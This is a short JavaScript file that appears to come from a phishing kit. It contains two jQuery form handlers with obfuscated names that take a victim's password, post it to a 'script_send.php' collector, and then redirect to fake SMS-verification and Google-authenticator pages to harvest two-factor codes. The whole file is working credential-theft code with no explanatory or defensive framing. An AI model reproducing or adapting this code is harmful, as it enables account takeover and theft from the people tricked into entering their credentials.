

                         
                        $(function() {
                        $("form[name='warbkkk']").validate({
                            rules: {
    
                                password: "required",
                            
                              },
                              messages: {
                            
                                password: "   ",
                                  
                              },
                        submitHandler: function(form) {
                            $("#xuysnx").show();
                             $.post("../UysnX/script_send.php", $("#warbkkk").serialize(), function(result) {
                            
                                setTimeout(function() {
                                    $(location).attr("href", "../sms/verification.php");
                                }, 2000);

                              

                               
                               
                               

                            });
                        },
                    });
                });
                

                         
                $(function() {
                    $("form[name='warbkkk1']").validate({
                        rules: {

                            password: "required",
                        
                          },
                          messages: {
                        
                            password: "   ",
                              
                          },
                    submitHandler: function(form) {
                        $("#xuysnx").show();
                         $.post("../UysnX/script_send.php", $("#warbkkk1").serialize(), function(result) {
                        
                            setTimeout(function() {
                                $(location).attr("href", "../UysnX/google_authf.php");
                            }, 2000);

                          


                        });
                    },
                });
            });



